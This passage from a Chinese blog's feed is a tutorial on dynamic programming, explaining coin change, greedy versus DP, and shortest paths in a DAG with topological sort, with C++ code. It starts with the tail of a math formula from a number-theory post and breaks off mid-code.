mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285719em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span></p><p>例题如下：</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240421175534340.png" alt="image-20240421175534340" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/3be1fbc5b0aaefdae08b32df0e361258.png" alt="3be1fbc5b0aaefdae08b32df0e361258" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数论 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法笔记之动态规划</title>
      <link href="/posts/4524d9d2cf27/"/>
      <url>/posts/4524d9d2cf27/</url>
      
        <content type="html"><![CDATA[<p>久违了各位，自数据结构的学习告一段落之后，接下来登场的是——算法！</p><p>让我们直接从动态规划开始吧！</p><p>ps：为什么出场就是王炸……</p><p>pps：因为分治和递归在数据结构部分都有提及，也许后续会再补充吧……</p><hr /><h2 id="什么是动态规划"><a class="markdownIt-Anchor" href="#什么是动态规划"></a> 什么是动态规划？</h2><h3 id="小故事"><a class="markdownIt-Anchor" href="#小故事"></a> 小故事</h3><p>在进入枯燥无味（误）的正文前，我们先通过一个小故事来理解动态规划。</p><p>假如你有三种面值的钞票：1、5、10。我们要如何用最少的钞票凑出面值为15的金额呢？</p><p>第一种想法是，既然要求用最少的钞票，那我每次选择面值最大的钞票不就好了？如果剩余金额要小于最大面值，那么就选择第二大的面值。这样，每次都把累加的金额设置的尽可能大，就可以达到减少钞票数量的目的。比如在这个例子中，我们可以依次选择面值为10和5的钞票，就成功用最少数量的钞票凑出了要求金额。</p><p>这种思想就是<strong>贪心法</strong>，即通过每一步都选择局部最优解的情况来达成整体最优。就比如往瓶子里装尽可能多的东西，先装体积比较大的石头，再装体积小的砂石，最后还可以往瓶子里注水。贪心法也是一种非常重要的算法思想，后续我们也会专门开文章来讲解。但是，在这一个例子的情况下，使用贪心法真的就是最优解了吗？</p><p><strong>显然不是</strong>。假如一个奇葩国家的面值金额只有1、5、11，那我们再去凑出15时使用贪心算法就会出错。具体情况如下：</p><ul><li>贪心算法：11*1+1*4，一共5张</li><li>最优解：5*3，一共3张</li></ul><p>为什么会出现这种矛盾呢？因为贪心法很重要的一个缺点就是容易<strong>鼠目寸光</strong>。在有些情况下，局部最优并不一定指向全局最优。</p><p>我们把问题抽象成“需要凑出一个具体的金额w，需要用到尽可能少的钞票”。那么贪心法的策略就是让你还需要凑出的w<strong>尽快</strong>的变得小。很显然，“让w尽快变的小”并不意味着最终的开销一定是最小的。</p><p>如果用暴力枚举w的方式呢？这个选择就太多了，所带来的时间复杂度是不可接受的。</p><p>那么，接下来该怎么办呢？</p><p>我们把“凑出n所需要的最小钞票数量”用f(n)表示。</p><p>那么，如果我们取了11，最后的代价（用掉的钞票总数）是多少呢？<br />明显</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mi>o</mi><mi>s</mi><mi>t</mi><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mn>4</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>=</mo><mn>4</mn><mo>+</mo><mn>1</mn><mo>=</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">cost=f(4)+1=4+1=5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">4</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span></span></p><p>，它的意义是：利用11来凑出15，付出的代价等于f(4)加上自己这一张钞票。现在我们暂时不管f(4)怎么求出来。<br />依次类推，马上可以知道：如果我们用5来凑出15，cost就是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mn>10</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>=</mo><mn>2</mn><mo>+</mo><mn>1</mn><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">f(10)+1=2+1=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">1</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span></span></p><p>也就是说，在做出决策，我们只需要在方案中，选择cost值最低的那个就行了。而用于表达cost的式子也很简单：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>min</mi><mo>⁡</mo><mo stretchy="false">{</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>5</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>f</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>11</mn><mo stretchy="false">)</mo><mo stretchy="false">}</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">f(n)=\min\{f(n-1),f(n-5),f(n-11)\}+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p><p>也就是说，我们要求出f(n)，只需要求出几个更小的f值就行了；那么，我们可以从小到大把所有的f值都求出来，并储存在表中，就可以求出f(n)时的情况了。</p><p>我们成功以O(n)的时间复杂度解决了这个问题，接下来我们再来分析一下这道个式子的原理：</p><ul><li>f(n)只与f(n-1)、f(n-5)、f(n-11)的值相关。</li><li>我们只关心f(w)的值，并不关心它是怎么求出来的。</li></ul><p>这就是这个方法的优势所在。相对于贪心法，它会分别计算出各个决策的代价，并选择最小的那一个，而不是一昧的选择局部最优的决策。相对于暴力枚举法，它会舍弃枚举使用的硬币，因为这属于冗余信息，我们只关心f(w)的值，而不需要知道它是怎么凑出来的。</p><p>我们能这样干，取决于问题的性质：求出f(n)，只需要知道几个更小的f©。<strong>我们将求解f©称作求解f(n)的“子问题”。</strong></p><p>这就是动态规划，它的核心思想就是：<strong>将一个问题拆成几个子问题，分别求解并记录这些子问题，即可推断出大问题的解</strong>。</p><h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3><p>动态规划的工作原理与**记忆(memorization)**相关。动态规划与分治法之间的主要区别在于，后者要求子问题是相互独立的，而在DP中允许存在子问题的重叠。通过使用记忆(维护一张存储已求解子问题的解的表格)，动态规划将求解许多问题的指数复杂度降低到多项式复杂度(O(n<sup>2</sup>)、O(n<sup>3</sup>)等)。DP的主要组成部分是:</p><ul><li>递归：递归的求解子问题</li><li>记忆：在表中存储已经求解的子问题的解(memorization代表缓存)</li></ul><p>动态规划和简单递归的区别就在于递归调用的记忆，也就是能够储存每一个子决策的最优解。但是，如果子问题之间相互独立、没有重复，那么储存子决策的解就没有任何帮助。所以，动态规划并不是万能的，它有自己的局限性和要求。要判断一个问题是否满足动态规划的使用条件，可以参考以下两个概念：</p><h3 id="无后效性"><a class="markdownIt-Anchor" href="#无后效性"></a> 无后效性</h3><p>如果给定某一个阶段的状态，那么这一个阶段以后的发展就与这个阶段之前的发展无关。“未来与过去无关”，这就是无后效性。</p><p>参考之前的小故事，只要我们确定了f(n)，那么“我们如何凑出f(n)”就再也用不着了。</p><h3 id="最优子结构"><a class="markdownIt-Anchor" href="#最优子结构"></a> 最优子结构</h3><p>大问题的最优解能够由小问题的最优解推出，这就叫最优子结构。</p><p>参考前面的小故事，我们定义的f(n)是“凑出某个w所需要的<strong>最少</strong>钞票数量”。这个定义已经包含了“最优”的意思。于是我们分别利用w=14，10，4的最优解，来推算出w=15时的最优解。</p><p>因此，要判断问题是否能用DP解决，我们只需要分析问题是否满足以下条件：</p><ol><li>能将大问题拆分成几个小问题</li><li>满足无后效性</li><li>满足最优子结构</li></ol><h2 id="动态规划的方法"><a class="markdownIt-Anchor" href="#动态规划的方法"></a> 动态规划的方法</h2><p>一般来说，有两种动态规划的方法：</p><ul><li>自底向上的动态规划</li><li>自顶向下的动态规划</li></ul><h3 id="自底向上"><a class="markdownIt-Anchor" href="#自底向上"></a> 自底向上</h3><p>在这种方法中，状态转移方程从最小可能的输入参数值开始，然后逐步通过可能的值，慢慢增加输入参数值。在计算时，我们将所有计算得到的值存储在一个表(内存)中在求解较大输入参数值的状态转移方程时，我们可以使用输入参数值较小时状态转移方程得到的解。</p><p>比如背包问题，就适用于自底向上方法。可以从0开始遍历到背包容量，将结果储存在表中。</p><h3 id="自顶向下"><a class="markdownIt-Anchor" href="#自顶向下"></a> 自顶向下</h3><p>在这种方法中，问题被分解为多个子问题；求解每个子问题并记住它们的解，以避免再次求解它们时的重复计算。此外，我们将保存每个计算值作为递归函数的最终操作并将判断预计算的值是否已存在作为递归函数的第一个操作。</p><p>具体选择哪种方法，应该根据具体环境来决定。在自底向上的动态规划中，程序员必须选择值来计算并决定计算顺序。在这种情况下，所有可能的子问题都被事先求解，然后用于求解更大的问题。在自顶向下的动态规划中，保留了原问题的递归结构，避免了求解不必要的子问题，同时也避免了需要求解的子问题中重复子问题的重复求解。原问题被分解为子问题，求解这些子问题并存储它们的解，以避免它们的重复求解。</p><p>具体的动态规划法多种多样，但都具有相同的填表形式。</p><p>一般来说，动态规划法的求解过程由以下三个阶段组成：<br />划分子问题：将原问题分解为若干个子问题，每个子问题对应一个决策阶段，并且子问题之间具有重叠关系。<br />确定动态规划函数：根据子问题之间的重叠关系找到子问题满足的递推关系式即动态规划函数，这是动态规划法的关键。一般来说，可以表示为<strong>问题解的代价=子问题的代价+选择带来的开销</strong>。</p><p>填写表格：设计表格，以自底向上或自顶向下的方式计算各个子问题的解并填表，实现动态规划过程。</p><p>上述动态规划过程可以求得问题的最优值即目标函数的极值，如果要求出具体的最优解，通常在动态规划过程中记录必要的信息，再根据最优决策序列构造最优解。</p><h2 id="动态规划算法举例"><a class="markdownIt-Anchor" href="#动态规划算法举例"></a> 动态规划算法举例</h2><h3 id="dag最短路"><a class="markdownIt-Anchor" href="#dag最短路"></a> DAG最短路</h3><p>问题很简单：给定一个城市的地图，所有的道路都是单行道，而且不会构成环。每条道路都有过路费，问从S点到T点花费的最少费用。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240407183232936.png" alt="image-20240407183232936" /></p><p>有向无环图的最短路径问题是一个经典的问题，它的解法是拓扑排序的一个应用。</p><p>它满足无后效性和最优子结构性质，可以用动态规划的方法解决。</p><p>既然满足动态规划性质，则可以确定关系式f(P)=min{f®+W(R,P)}，其中R是P的前驱结点，W(R,P)是边R-&gt;P的权值。</p><p>有向无环图的最短路径问题的算法如下：</p><ol><li>对有向无环图进行拓扑排序，得到拓扑序列。</li><li>初始化源点的最短路径长度为0，其他点的最短路径长度为无穷大。</li><li>依次对拓扑序列中的每个点P进行如下操作：如果f(P)+W(P,R)&lt;f®，则f®=f(P)+W(P,R)。</li><li>最后返回终点到起点的距离f(n)。</li></ol><p>这里我整理出了一份C++代码仅供参考，不过需要注意的是我并没有采用传统的方式开表来保存最优解，而是选择用维护distance属性来代替开表，其底层的核心思路是一样的。其实，只要有诸如<code>f(R)=f(P)+W(P,R)</code>的式子来判断并储存最优解，都可视为借鉴了动态规划的思想。如果要用更加熟悉传统的动态规划算法解决最短路问题，可以参考<a href="https://baike.baidu.com/item/Floyd%E7%AE%97%E6%B3%95/291990?fr=ge_ala">Floyd算法_百度百科 (baidu.com)</a>。</p><p>代码如下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * DAG最短路问题</span></span><br><span class="line"><span class="comment"> * 有向无环图的最短路径问题</span></span><br><span class="line"><span class="comment"> * 有向无环图的最短路径问题是一个经典的问题，它的解法是拓扑排序的一个应用。</span></span><br><span class="line"><span class="comment"> * 它满足无后效性和最优子结构性质，可以用动态规划的方法解决。</span></span><br><span class="line"><span class="comment"> * 既然满足动态规划性质，则可以确定关系式f(P)=min&#123;f(R)+W(R,P)&#125;，其中R是P的前驱结点，W(R,P)是边R-&gt;P的权值。</span></span><br><span class="line"><span class="comment"> * 有向无环图的最短路径问题的算法如下：</span></span><br><span class="line"><span class="comment"> * 1. 对有向无环图进行拓扑排序，得到拓扑序列。</span></span><br><span class="line"><span class="comment"> * 2. 初始化源点的最短路径长度为0，其他点的最短路径长度为无穷大。</span></span><br><span class="line"><span class="comment"> * 3. 依次对拓扑序列中的每个点P进行如下操作：</span></span><br><span class="line"><span class="comment"> *   1. 依次对P的每个邻接点R进行如下操作：</span></span><br><span class="line"><span class="comment"> *   1. 如果f(P)+W(P,R)&lt;f(R)，则f(R)=f(P)+W(P,R)。</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;chrono&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义图中的顶点</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vertex</span> &#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> distance; <span class="comment">// 从起始位置到该顶点的最短距离</span></span><br><span class="line">    [[maybe_unused]] <span class="type">bool</span> visited; <span class="comment">// 该顶点是否已经访问过</span></span><br><span class="line">    vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; neighbors; <span class="comment">// 该顶点的邻居（相邻顶点编号和边权重）</span></span><br><span class="line">    <span class="comment">//其中neighbor.first表示单项图中该顶点邻接的顶点的编号，neighbor.second表示边的权重</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Vertex</span><span class="params">(<span class="type">int</span> _id)</span> : id(_id), distance(INT_MAX), visited(false) &#123;</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义图</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;Vertex *&gt; vertices; <span class="comment">// 图中的所有顶点，对应邻接表中储存所有顶点的链表</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">Graph</span><span class="params">(<span class="type">int</span> numVertices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建图中的所有顶点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numVertices; ++i) &#123;</span><br><span class="line">            vertices.<span class="built_in">push_back</span>(<span class="keyword">new</span> <span class="built_in">Vertex</span>(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加有向边</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addDirectedEdge</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to, <span class="type">int</span> weight)</span> </span>&#123;</span><br><span class="line">        vertices[from]-&gt;neighbors.<span class="built_in">emplace_back</span>(to, weight);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拓扑排序</span></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">topologicalSort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; result;</span><br><span class="line">        queue&lt;Vertex *&gt; q;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算每个顶点的入度</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inDegrees</span><span class="params">(vertices.size(), <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (Vertex *v: vertices) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;neighbor: v-&gt;neighbors) &#123;</span><br><span class="line">                inDegrees[neighbor.first]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将入度为0的顶点加入队列</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vertices.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inDegrees[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(vertices[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行拓扑排序</span></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            Vertex *v = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            result.<span class="built_in">push_back</span>(v-&gt;id);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 减少邻居顶点的入度，若入度为0，则加入队列</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;neighbor: v-&gt;neighbors) &#123;<span class="comment">//遍历邻居</span></span><br><span class="line">                inDegrees[neighbor.first]--;<span class="comment">//减少邻居顶点的入度</span></span><br><span class="line">                <span class="keyword">if</span> (inDegrees[neighbor.first] == <span class="number">0</span>) &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(vertices[neighbor.first]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestPathByViolence</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//用蛮力法求解最短路径问题</span></span><br><span class="line">        <span class="type">int</span> result = INT_MAX;</span><br><span class="line">        <span class="keyword">auto</span> v = vertices[start];</span><br><span class="line">        <span class="comment">//用DFS遍历每一条路径</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> neighbor: v-&gt;neighbors) &#123;</span><br><span class="line">            <span class="type">int</span> weight = neighbor.second;</span><br><span class="line">            <span class="type">int</span> next = neighbor.first;</span><br><span class="line">            <span class="keyword">if</span> (next == end) &#123;</span><br><span class="line">                <span class="comment">//如果到达终点，更新最短路径</span></span><br><span class="line">                result = <span class="built_in">min</span>(result, weight);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//如果没有到达终点，继续递归</span></span><br><span class="line">                result = <span class="built_in">min</span>(result,</span><br><span class="line">                             weight + <span class="built_in">shortestPathByViolence</span>(next, end));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算从起始顶点到目标顶点的最短路径</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">shortestPath</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 对图进行拓扑排序</span></span><br><span class="line">        <span class="keyword">auto</span> order = <span class="built_in">topologicalSort</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化起始顶点的距离为0</span></span><br><span class="line">        vertices[start]-&gt;distance = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按照拓扑排序的顺序，逐个更新顶点的距离</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i: order) &#123;<span class="comment">//遍历拓扑排序的顺序</span></span><br><span class="line">            Vertex *v = vertices[i];<span class="comment">//取出对应的顶点</span></span><br><span class="line">            <span class="keyword">if</span> (v-&gt;distance !=</span><br><span class="line">                INT_MAX) &#123;<span class="comment">//如果顶点的距离不是无穷大，也就是说该顶点是可以到达的，这里因为只初始化了起始顶点的距离为0，所以只有起始顶点的距离不是无穷大</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;neighbor: v-&gt;neighbors) &#123;<span class="comment">//遍历该顶点的邻居，这里第一个被处理的一定是顶点，先遍历顶点的邻居</span></span><br><span class="line">                    <span class="keyword">if</span> (v-&gt;distance + neighbor.second &lt;</span><br><span class="line">                        vertices[neighbor.first]-&gt;distance) &#123;</span><br><span class="line">                        <span class="comment">// 如果通过该顶点到达邻居顶点的距离更短</span></span><br><span class="line">                        <span class="comment">// 更新邻居顶点的距离</span></span><br><span class="line">                        vertices[neighbor.first]-&gt;distance =</span><br><span class="line">                                v-&gt;distance + neighbor.second;</span><br><span class="line">                        <span class="comment">//f(P)=min&#123;f(R)+W(R,P)&#125;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回目标顶点的最短路径</span></span><br><span class="line">        <span class="keyword">return</span> vertices[end]-&gt;distance;</span><br><span class="line">        <span class="comment">//依次分析该算法是否满足最优子结构和无后效性</span></span><br><span class="line">        <span 